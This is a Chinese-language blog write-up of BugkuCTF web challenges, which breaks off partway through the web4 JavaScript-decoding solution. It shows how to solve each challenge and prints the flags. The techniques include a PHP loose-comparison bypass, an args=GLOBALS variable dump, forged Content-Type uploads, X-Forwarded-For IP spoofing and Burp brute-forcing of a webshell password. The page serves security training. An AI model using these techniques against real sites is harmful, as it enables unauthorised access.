<!DOCTYPE html>
<html lang="en">
    <!-- title -->




<!-- keywords -->




<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
    <meta name="author" content="Qftm">
    <meta name="renderer" content="webkit">
    <meta name="copyright" content="Qftm">
    
    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
    
    <meta name="description" content="">
    <meta http-equiv="Cache-control" content="no-cache">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
    <title>BugkuCTF Web WriteUp · Qftm&#39;s Blog</title>
    <style type="text/css">
    @font-face {
        font-family: 'Oswald-Regular';
        src: url("/font/Oswald-Regular.ttf");
    }

    body {
        margin: 0;
    }

    header,
    footer,
    .back-top,
    .sidebar,
    .container,
    .site-intro-meta,
    .toc-wrapper {
        display: none;
    }

    .site-intro {
        position: relative;
        z-index: 3;
        width: 100%;
        /* height: 50vh; */
        overflow: hidden;
    }

    .site-intro-placeholder {
        position: absolute;
        z-index: -2;
        top: 0;
        left: 0;
        width: calc(100% + 300px);
        height: 100%;
        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
        background-position: center center;
        transform: translate3d(-226px, 0, 0);
        animation: gradient-move 2.5s ease-out 0s infinite;
    }

    @keyframes gradient-move {
        0% {
            transform: translate3d(-226px, 0, 0);
        }
        100% {
            transform: translate3d(0, 0, 0);
        }
    }

</style>

    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
    
    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
    
    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
/* This file is meant as a standalone workflow for
- testing support for link[rel=preload]
- enabling async CSS loading in browsers that do not support rel=preload
- applying rel preload css once loaded, whether supported or not.
*/ -->
<script>
(function( w ){
	"use strict";
	// rel=preload support test
	if( !w.loadCSS ){
		w.loadCSS = function(){};
	}
	// define on the loadCSS obj
	var rp = loadCSS.relpreload = {};
	// rel=preload feature support test
	// runs once and returns a function for compat purposes
	rp.support = (function(){
		var ret;
		try {
			ret = w.document.createElement( "link" ).relList.supports( "preload" );
		} catch (e) {
			ret = false;
		}
		return function(){
			return ret;
		};
	})();

	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
	// then change that media back to its intended value on load
	rp.bindMediaToggle = function( link ){
		// remember existing media attr for ultimate state, or default to 'all'
		var finalMedia = link.media || "all";

		function enableStylesheet(){
			link.media = finalMedia;
		}

		// bind load handlers to enable media
		if( link.addEventListener ){
			link.addEventListener( "load", enableStylesheet );
		} else if( link.attachEvent ){
			link.attachEvent( "onload", enableStylesheet );
		}

		// Set rel and non-applicable media type to start an async request
		// note: timeout allows this to happen async to let rendering continue in IE
		setTimeout(function(){
			link.rel = "stylesheet";
			link.media = "only x";
		});
		// also enable media after 3 seconds,
		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
		setTimeout( enableStylesheet, 3000 );
	};

	// loop through link elements in DOM
	rp.poly = function(){
		// double check this to prevent external calls from running
		if( rp.support() ){
			return;
		}
		var links = w.document.getElementsByTagName( "link" );
		for( var i = 0; i < links.length; i++ ){
			var link = links[ i ];
			// qualify links to those with rel=preload and as=style attrs
			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
				// prevent rerunning on link
				link.setAttribute( "data-loadcss", true );
				// bind listeners to toggle media back
				rp.bindMediaToggle( link );
			}
		}
	};

	// if unsupported, run the polyfill
	if( !rp.support() ){
		// run once at least
		rp.poly();

		// rerun poly on an interval until onload
		var run = w.setInterval( rp.poly, 500 );
		if( w.addEventListener ){
			w.addEventListener( "load", function(){
				rp.poly();
				w.clearInterval( run );
			} );
		} else if( w.attachEvent ){
			w.attachEvent( "onload", function(){
				rp.poly();
				w.clearInterval( run );
			} );
		}
	}


	// commonjs
	if( typeof exports !== "undefined" ){
		exports.loadCSS = loadCSS;
	}
	else {
		w.loadCSS = loadCSS;
	}
}( typeof global !== "undefined" ? global : this ) );
</script>

    <link rel="icon" href= "/assets/favicon.ico" />
    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
    <link rel="preload" href="/scripts/main.js" as="script" />
    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
    
    <!-- fancybox -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
    <!-- 百度统计  -->
    
    <!-- 谷歌统计  -->
    
<meta name="generator" content="Hexo 4.2.0"></head>

    
        <body class="post-body">
    
    
<header class="header">

    <div class="read-progress"></div>
    <div class="header-sidebar-menu">&#xe775;</div>
    <!-- post页的toggle banner  -->
    
    <div class="banner">
            <div class="blog-title">
                <a href="/" >Qftm&#39;s Blog</a>
            </div>
            <div class="post-title">
                <a href="#" class="post-name">BugkuCTF Web WriteUp</a>
            </div>
    </div>
    
    <a class="home-link" href=/>Qftm's Blog</a>
</header>
    <div class="wrapper">
        <div class="site-intro" style="







height:50vh;
">
    
    <!-- 主页  -->
    
    
    <!-- 404页  -->
            
    <div class="site-intro-placeholder"></div>
    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
    <div class="site-intro-meta">
        <!-- 标题  -->
        <h1 class="intro-title">
            <!-- 主页  -->
            
            BugkuCTF Web WriteUp
            <!-- 404 -->
            
        </h1>
        <!-- 副标题 -->
        <p class="intro-subtitle">
            <!-- 主页副标题  -->
            
            
            <!-- 404 -->
            
        </p>
        <!-- 文章页meta -->
        
            <div class="post-intros">
                <!-- 文章页标签  -->
                
                    <div class= post-intro-tags >
    
        <a class="post-tag" href="javascript:void(0);" data-tags = "CTF">CTF</a>
    
</div>
                
                
                    <div class="post-intro-read">
                        <span>Word count: <span class="post-count word-count">9.6k</span>Reading time: <span class="post-count reading-time">47 min</span></span>
                    </div>
                
                <div class="post-intro-meta">
                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
                    <span class="post-intro-time">2019/02/16</span>
                    
                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                        <span class="iconfont-archer">&#xe602;</span>
                        <span id="busuanzi_value_page_pv"></span>
                    </span>
                    
                    <span class="shareWrapper">
                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
                        <span class="shareText">Share</span>
                        <ul class="shareList">
                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
                                <div class="share-qrcode"></div>
                            </li>
                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
                        </ul>
                    </span>
                </div>
            </div>
        
    </div>
</div>
        <script>
 
  // get user agent
  var browser = {
    versions: function () {
      var u = window.navigator.userAgent;
      return {
        userAgent: u,
        trident: u.indexOf('Trident') > -1, //IE内核
        presto: u.indexOf('Presto') > -1, //opera内核
        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
        iPad: u.indexOf('iPad') > -1, //是否为iPad
        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
      };
    }()
  }
  console.log("userAgent:" + browser.versions.userAgent);

  // callback
  function fontLoaded() {
    console.log('font loaded');
    if (document.getElementsByClassName('site-intro-meta')) {
      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
      var postIntros = document.getElementsByClassName('post-intros')[0]
      if (postIntros) {
        postIntros.classList.add('post-fade-in');
      }
    }
  }

  // UC不支持跨域，所以直接显示
  function asyncCb(){
    if (browser.versions.uc) {
      console.log("UCBrowser");
      fontLoaded();
    } else {
      WebFont.load({
        custom: {
          families: ['Oswald-Regular']
        },
        loading: function () {  //所有字体开始加载
          // console.log('loading');
        },
        active: function () {  //所有字体已渲染
          fontLoaded();
        },
        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
          console.log('inactive: timeout');
          fontLoaded();
        },
        timeout: 5000 // Set the timeout to two seconds
      });
    }
  }

  function asyncErr(){
    console.warn('script load from CDN failed, will load local script')
  }

  // load webfont-loader async, and add callback function
  function async(u, cb, err) {
    var d = document, t = 'script',
      o = d.createElement(t),
      s = d.getElementsByTagName(t)[0];
    o.src = u;
    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
    s.parentNode.insertBefore(o, s);
  }

  var asyncLoadWithFallBack = function(arr, success, reject) {
      var currReject = function(){
        reject()
        arr.shift()
        if(arr.length)
          async(arr[0], success, currReject)
        }

      async(arr[0], success, currReject)
  }

  asyncLoadWithFallBack([
    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
    "/lib/webfontloader.min.js"
  ], asyncCb, asyncErr)
</script>        
        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
        <div class="container container-unloaded">
            <main class="main post-page">
    <article class="article-entry">
        <p>今天把之前做的题整理一下，方便有需要的人学习 φ(゜▽゜*)♪</p>
<p><strong>1、web2</strong></p>
<p>考点：F12的利用</p>
<p>Topic Link：<a href="http://123.206.87.240:8002/web2/" target="_blank" rel="noopener">http://123.206.87.240:8002/web2/</a></p>
<p><img src="/2019/02/16/BugkuCTF~Web~WriteUp/1594459-20190216125102313-1620209206.png" alt="img"></p>
<p>打开连接，特别的不一样，直接F12可得flag</p>
<p>get flag:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag KEY&#123;Web-2-bugKssNNikls9100&#125;</span><br></pre></td></tr></table></figure>



<p><strong>2、计算器</strong></p>
<p>考点：F12的利用</p>
<p>Topic Link：<a href="http://123.206.87.240:8002/yanzhengma/" target="_blank" rel="noopener">http://120.24.86.145:8002/yanzhengma/</a></p>
<p><img src="/2019/02/16/BugkuCTF~Web~WriteUp/20180717231330871.png" alt="img"></p>
<p><img src="/2019/02/16/BugkuCTF~Web~WriteUp/20180717231618777.png" alt="img"></p>
<p>发现输入框对输入的数据长度有限制，F12进行修改长度输入正确结果即可获得flag一枚</p>
<p><img src="/2019/02/16/BugkuCTF~Web~WriteUp/2018071723191078.png" alt="img"></p>
<p>get flag:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;CTF-bugku-0032&#125;</span><br></pre></td></tr></table></figure>



<p><strong>3、web基础$_GET</strong></p>
<p>考点： 代码审计、$_GET利用</p>
<p>Topic Link：<a href="http://123.206.87.240:8002/get/" target="_blank" rel="noopener">http://</a><a href="http://123.206.87.240:8002/yanzhengma/" target="_blank" rel="noopener">120.24.86.145</a><a href="http://123.206.87.240:8002/get/" target="_blank" rel="noopener">:8002/get/</a></p>
<p><img src="/2019/02/16/BugkuCTF~Web~WriteUp/20180717232054161.png" alt="img"></p>
<p>传送$_GET型数据即可获得flag一枚</p>
<p><img src="/2019/02/16/BugkuCTF~Web~WriteUp/20180717233133609.png" alt="img"></p>
<p>get flag:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flagflag&#123;bugku_get_su8kej2en&#125;</span><br></pre></td></tr></table></figure>



<p><strong>4、web基础$_POST</strong></p>
<p>考点：代码审计、$_POST利用</p>
<p>Topic Link：<a href="http://123.206.87.240:8002/post/" target="_blank" rel="noopener">http://</a><a href="http://123.206.87.240:8002/yanzhengma/" target="_blank" rel="noopener">120.24.86.145</a><a href="http://123.206.87.240:8002/post/" target="_blank" rel="noopener">:8002/post/</a></p>
<p><img src="/2019/02/16/BugkuCTF~Web~WriteUp/20180717233507330.png" alt="img"></p>
<p>提交$_POST数据即可获得flag一枚</p>
<p><img src="/2019/02/16/BugkuCTF~Web~WriteUp/20180717233652920.png" alt="img"></p>
<p>get flag:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flagflag&#123;bugku_get_ssseint67se&#125;</span><br></pre></td></tr></table></figure>



<p><strong>5、**</strong>矛盾**</p>
<p>考点：php弱类型</p>
<p>Topic Link：<a href="http://123.206.87.240:8002/get/index1.php" target="_blank" rel="noopener">http://</a><a href="http://123.206.87.240:8002/yanzhengma/" target="_blank" rel="noopener">120.24.86.145</a><a href="http://123.206.87.240:8002/get/index1.php" target="_blank" rel="noopener">:8002/get/index1.php</a></p>
<p><img src="/2019/02/16/BugkuCTF~Web~WriteUp/20180717233908278.png" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$num&#x3D;$_GET[&#39;num&#39;];</span><br><span class="line">if(!is_numeric($num))</span><br><span class="line">&#123;</span><br><span class="line">echo $num;</span><br><span class="line">if($num&#x3D;&#x3D;1)</span><br><span class="line">echo &#39;flag&#123;**********&#125;&#39;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看了确实矛盾，不让传递纯数字数据却要和纯数字1相等，该怎么办呢，</p>
<p>这里可以利用PHP的“==”弱类型漏洞进行绕过</p>
<p>构造playload为<a href="http://120.24.86.145:8002/get/index1.php?num=1aaa即可获得flag一枚" target="_blank" rel="noopener">http://120.24.86.145:8002/get/index1.php?num=1aaa即可获得flag一枚</a></p>
<p><img src="/2019/02/16/BugkuCTF~Web~WriteUp/2018071723490276.png" alt="img"></p>
<p>get flag:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;bugku-789-ps-ssdf&#125;</span><br></pre></td></tr></table></figure>



<p><strong>6、web3</strong></p>
<p>考点：编码&amp;解码</p>
<p>Topic Link：<a href="http://123.206.87.240:8002/web3/" target="_blank" rel="noopener">http://</a><a href="http://120.24.86.145:8002/get/index1.php?num=1aaa" target="_blank" rel="noopener">120.24.86.145</a><a href="http://123.206.87.240:8002/web3/" target="_blank" rel="noopener">:8002/web3/</a></p>
<p><img src="/2019/02/16/BugkuCTF~Web~WriteUp/20180717235044559.png" alt="img"></p>
<p>提示flag在这里那就在这找吧，F12得到一串特殊的字符串，进行ASCII转化或者直接放入浏览器的地址栏里直接回车即可获得flag一枚</p>
<p><img src="/2019/02/16/BugkuCTF~Web~WriteUp/20180717235254132.png" alt="img"></p>
<p><img src="/2019/02/16/BugkuCTF~Web~WriteUp/20180717235513650.png" alt="img"></p>
<p> get flag:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KEY&#123;J2sa42ahJK&amp;#4&#125;</span><br></pre></td></tr></table></figure>



<p><strong>7. 域名解析</strong></p>
<p>考点：域名解析</p>
<p>Topic Link：flag.bugku.com</p>
<p><img src="/2019/02/16/BugkuCTF~Web~WriteUp/20180718000142241.png" alt="img"></p>
<p>按题目要求域名解析flag.bugku.com，才能得到flag</p>
<p>配置hosts文件，将120.24.86.145　flag.bugku.com添加进去，然后访问flag.bugku.com即可获得flag一枚</p>
<p>Linux系统在/etc/hosts目录下，修改需要root权限</p>
<p>windows系统在c:\windows\system32\drivers\etc\hosts目录下，若不让修改，可以把之前的进行备份然后新建一个hosts文本文档进行追加覆盖</p>
<p> get flag:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KEY&#123;DSAHDSJ82HDS2211&#125;</span><br></pre></td></tr></table></figure>



<p><strong>8. 你必须让他停下</strong></p>
<p>考点：网页抓包分析</p>
<p>Topic Link：<a href="http://123.206.87.240:8002/web12/" target="_blank" rel="noopener">http://123.206.87.240:8002/web12/</a></p>
<p><img src="/2019/02/16/BugkuCTF~Web~WriteUp/2018071814281315.png" alt="img"></p>
<p>发现页面一直在闪动，Ｆ１２可看到flag is here~，先用ＢＰ抓个包分析可知一直点击go的时候，服务器的响应报文中一个图片&gt;<div><img src="/2019/02/16/BugkuCTF~Web~WriteUp/QSec/Documents/Qftm Blog/Hexo/source/_posts/10.jpg"></div>一直在变，发现当如果是10.jpg的时候服务器的响应报文中有flag</p>
<p><img src="/2019/02/16/BugkuCTF~Web~WriteUp/20180718143447781.png" alt="img"></p>
<p> get flag:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;dummy_game_1s_s0_popular&#125;</span><br></pre></td></tr></table></figure>



<p><strong>9. 文件上传测试</strong></p>
<p>考点：文件上传</p>
<p>Topic Link：<a href="http://103.238.227.13:10085/" target="_blank" rel="noopener">http://103.238.227.13:10085/</a></p>
<p><img src="/2019/02/16/BugkuCTF~Web~WriteUp/20180717230232806.png" alt="img"></p>
<p>按要求提交一个PHP文件，服务端却提示非图片文件</p>
<p>尝试改后缀名为图片格式(jpg png gif)却不行</p>
<p>可能就是Content-Type的缘故，BP抓包，将Content-Type改为image/jpeg即可得到flag一枚</p>
<p><img src="/2019/02/16/BugkuCTF~Web~WriteUp/20180717231011618.png" alt="img"></p>
<p>get flag:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Flag:42e97d465f962c53df9549377b513c7e</span><br></pre></td></tr></table></figure>



<p><strong>10. 变量1</strong></p>
<p>考点：php变量覆盖漏洞 $$</p>
<p>Topic Link：<a href="http://120.24.86.145:8004/index1.php?args=GLOBALS" target="_blank" rel="noopener">http://120.24.86.145:8004/index1.php</a></p>
<p><img src="/2019/02/16/BugkuCTF~Web~WriteUp/20180718144513549.png" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">flag In the variable ! &lt;?php  </span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;flag1.php&quot;;</span><br><span class="line">highlight_file(__file__);</span><br><span class="line">if(isset($_GET[&#39;args&#39;]))&#123;</span><br><span class="line">    $args &#x3D; $_GET[&#39;args&#39;];</span><br><span class="line">    if(!preg_match(&quot;&#x2F;^\w+$&#x2F;&quot;,$args))&#123;</span><br><span class="line">        die(&quot;args error!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    eval(&quot;var_dump($$args);&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>分析代码可以发现是php变量覆盖漏洞，构造payload</p>
<p><a href="http://120.24.86.145:8004/index1.php?args=GLOBALS" target="_blank" rel="noopener">http://120.24.86.145:8004/index1.php?args=GLOBALS</a></p>
<p>打印变量表中的所有变量，即可获得flag一枚 </p>
<p><img src="/2019/02/16/BugkuCTF~Web~WriteUp/20180718145106803.png" alt="img"></p>
<p> get flag:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;92853051ab894a64f7865cf3c2128b34&#125;</span><br></pre></td></tr></table></figure>



<p><strong>11. web5</strong></p>
<p>考点：JS</p>
<p>Topic Link：<a href="http://123.206.87.240:8002/web5/" target="_blank" rel="noopener">http://123.206.87.240:8002/web5/</a></p>
<p><img src="/2019/02/16/BugkuCTF~Web~WriteUp/1594459-20190216133248277-1567916590.png" alt="img"></p>
<p>不知道submit什么，先查看源代码发现有一段JS编码，直接放到控制台就得到了flag</p>
<p><img src="/2019/02/16/BugkuCTF~Web~WriteUp/20180718150211557.png" alt="img"></p>
<p> get flag:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf&#123;whatfk&#125;</span><br></pre></td></tr></table></figure>



<p><strong>12. 头等舱</strong></p>
<p>考点：网页抓包分析</p>
<p>Topic Link：<a href="http://120.24.86.145:9009/hd.php" target="_blank" rel="noopener">http://120.24.86.145:9009/hd.php</a></p>
<p><img src="/2019/02/16/BugkuCTF~Web~WriteUp/20180718150940371.png" alt="img"></p>
<p>里面什么都没有，先抓个包看有没有有用信息，结果服务器的响应报文头部包含flag</p>
<p><img src="/2019/02/16/BugkuCTF~Web~WriteUp/20180718151212288.png" alt="img"></p>
<p>get flag:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Bugku_k8_23s_istra&#125;</span><br></pre></td></tr></table></figure>



<p><strong>13. 网站被黑</strong></p>
<p>考点： 字典爆破</p>
<p>Topic Link：<a href="http://123.206.87.240:8002/webshell/" target="_blank" rel="noopener">http://123.206.87.240:8002/webshell/</a></p>
<p><img src="/2019/02/16/BugkuCTF~Web~WriteUp/1594459-20190216145630487-790945944.png" alt="img"></p>
<p>根据提示网站存在漏洞，利用御剑扫描工具进行扫描</p>
<p><img src="/2019/02/16/BugkuCTF~Web~WriteUp/1594459-20190216150015658-274926856.png" alt="img"></p>
<p>进入shell.php网页中，发现需要密码验证，利用burpsuite进行爆破</p>
<p>爆破对象</p>
<p><img src="/2019/02/16/BugkuCTF~Web~WriteUp/1594459-20190216150611959-986029839.png" alt="img"></p>
<p>字典选取</p>
<p><img src="/2019/02/16/BugkuCTF~Web~WriteUp/1594459-20190216150543286-462933750.png" alt="img"></p>
<p> 读取结果</p>
<p><img src="/2019/02/16/BugkuCTF~Web~WriteUp/1594459-20190216150803409-1616106140.png" alt="img"></p>
<p>输入pass: hack</p>
<p><img src="/2019/02/16/BugkuCTF~Web~WriteUp/1594459-20190216150910782-584215288.png" alt="img"></p>
<p>get flag:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;hack_bug_ku035&#125;</span><br></pre></td></tr></table></figure>

<p>各类爆破字典集下载：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GitHub项目地址：https:&#x2F;&#x2F;github.com&#x2F;Qftm&#x2F;Blasting-dictionary</span><br></pre></td></tr></table></figure>



<p><strong>14. 管理员系统</strong></p>
<p>考点：IP伪造、base64编码</p>
<p>Topic Link：<a href="http://123.206.31.85:1003/" target="_blank" rel="noopener">http://123.206.31.85:1003/</a></p>
<p><img src="/2019/02/16/BugkuCTF~Web~WriteUp/1594459-20190216154438101-28745393.png" alt="img"></p>
<p>F12查看源码发现一个特殊的字符串 <!-- dGVzdDEyMw== --> 进行base64解密之后得到==》test123</p>
<p>利用用户名admin尝试登陆，发现未果，页面还是提示IP已被记录，抓包进行伪造IP，在HTTP请求中添加请求头X-Forwarded-For: 127.0.0.1</p>
<p>在响应包里面的源码里发现包含flag</p>
<p><img src="/2019/02/16/BugkuCTF~Web~WriteUp/1594459-20190216155108833-1002146854.png" alt="img"></p>
<p>get flag:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;85ff2ee4171396724bae20c0bd851f6b&#125;</span><br></pre></td></tr></table></figure>



<p><strong>15. web4</strong></p>
<p>考点：url编码</p>
<p>Topic Link：<a href="http://120.24.86.145:8002/web4/" target="_blank" rel="noopener">http://120.24.86.145:8002/web4/</a></p>
<p><img src="/2019/02/16/BugkuCTF~Web~WriteUp/20180718163422302.png" alt="img"></p>
<p>按提示查看源代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;title&gt;BKCTF-WEB4&lt;&#x2F;title&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div style&#x3D;&quot;display:none;&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;index.php&quot; method&#x3D;&quot;post&quot; &gt;</span><br><span class="line">看看源代码？&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var p1 &#x3D; &#39;%66%75%6e%63%74%69%6f%6e%20%63%68%65%63%6b%53%75%62%6d%69%74%28%29%7b%76%61%72%20%61%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%70%61%73%73%77%6f%72%64%22%29%3b%69%66%28%22%75%6e%64%65%66%69%6e%65%64%22%21%3d%74%79%70%65%6f%66%20%61%29%7b%69%66%28%22%36%37%64%37%30%39%62%32%62&#39;;</span><br><span class="line">var p2 &#x3D; &#39;%61%61%36%34%38%63%66%36%65%38%37%61%37%31%31%34%66%31%22%3d%3d%61%2e%76%61%6c%75%65%29%72%65%74%75%72%6e%21%30%3b%61%6c%65%72%74%28%22%45%72%72%6f%72%22%29%3b%61%2e%66%6f%63%75%73%28%29%3b%72%65%74%75%72%6e%21%31%7d%7d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%6c%65%76%65%6c%51%75%65%73%74%22%29%2e%6f%6e%73%75%62%6d%69%74%3d%63%68%65%63%6b%53%75%62%6d%69%74%3b&#39;;</span><br><span class="line">eval(unescape(p1) + unescape(&#39;%35%34%61%61%32&#39; + p2));</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;input type&#x3D;&quot;input&quot; name&#x3D;&quot;flag&quot; id&#x3D;&quot;flag&quot; &#x2F;&gt; </span><br><span class="line">&lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;Submit&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>将p1和p2，“%35%34%61%61%32”进行URL解码或者十六进制转换ASCII（不过需要先去除%）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">66 75 6e 63 74 69 6f 6e 20 63 68 65 63 6b 53 75 62 6d 69 74 28 29 7b 76 61 72 20 61 3d 64 6f 63 75 6d 65 6e 74 2e 67 65 74 45 6c 65 6d 65 6e 74 42 79 49 64 28 22 70 61 73 73 77 6f 72 64 22 29 3b 69 66 28 22 75 6e 64 65 66 69 6e 65 64 22 21 3d 74 79 70 65 6f 66 20 61 29 7b 69 66 28 22 36 37 64 37 30 39 62 32 62</span><br><span class="line"></span><br><span class="line">35 34 61 61 32</span><br><span class="line"></span><br><span class="line">61 61 36 34 38 63 66 36 65 38 37 61 37 31 31 34 66 31 22 3d 3d 61 2e 76 61 6c 75 65 29 72 65 74 75 72 6e 21 30 3b 61 6c 65 72 74 28 22 45 72 72 6f 72 22 29 3b 61 2e 66 6f 63 75 73 28 29 3b 72 65 74 75 72 6e 21 31 7d 7d 64 6f 63 75 6d 65 6e 74 2e 67 65 74 45 6c 65 6d 65 6e 74 42 79 49 64 28 22 6c 65 76 65 6c 51 75 65 73 74 22 29 2e 6f 6e 73 75 62 6d 69 74 3d 63 68 65 63 6b 53 75 62 6d 69 74 3b</span><br></pre></td></tr></table></figure>

<p>按照eval()函数进行组合，得到一个function函数</p>
